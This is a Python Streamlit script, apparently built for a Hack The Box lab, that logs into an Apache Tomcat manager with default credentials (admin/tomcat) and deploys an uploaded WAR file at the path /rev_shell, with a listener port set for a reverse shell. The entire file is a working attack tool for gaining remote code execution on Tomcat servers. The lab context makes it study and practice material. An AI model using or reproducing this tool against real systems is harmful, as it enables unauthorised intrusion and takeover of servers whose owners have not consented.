import streamlit as st
import requests

import importlib.util
import sys

# Define the absolute path to the module
module_path = r'C:\Users\calip\Desktop\DarkCircuit-\DarkCircuit-\models\v1.py'

# Load the module
spec = importlib.util.spec_from_file_location("v1", module_path)
v1 = importlib.util.module_from_spec(spec)
sys.modules["v1"] = v1
spec.loader.exec_module(v1)

# Now you can use the deploy_war function
deploy_war = v1.deploy_war

st.title("HTB: hardocded")
target_ip = st.text_input("Target IP", value="10.10.10.10")
username = st.text_input("Username", value="admin")
password = st.text_input("Password", value="tomcat", type="password")
listener_port = st.number_input("Listener Port", value=4444, step=1)
tomcat_url = f"http://{target_ip}:8080"

war_file = st.file_uploader("Upload WAR File", type=["war"])
if war_file is not None:
    war_content = war_file.read()

    if st.button("Deploy WAR"):

        deploy_url = f"{tomcat_url}/manager/text/deploy?path=/rev_shell&update=true"
        try:
          #deploy war is the hard coded function , provided with the right parameters for attack
            response = deploy_war(deploy_url, username, password, war_content)
            if response.status_code == 200 and "OK" in response.text:
                st.success("WAR file deployed successfully!")
                st.text_area("Response", response.text, height=100)
            else:
                st.error(f"Deployment failed. Status code: {response.status_code}")
                st.text_area("Response", response.text, height=100)
        except Exception as e:
            st.error(f"Error during deployment: {e}")
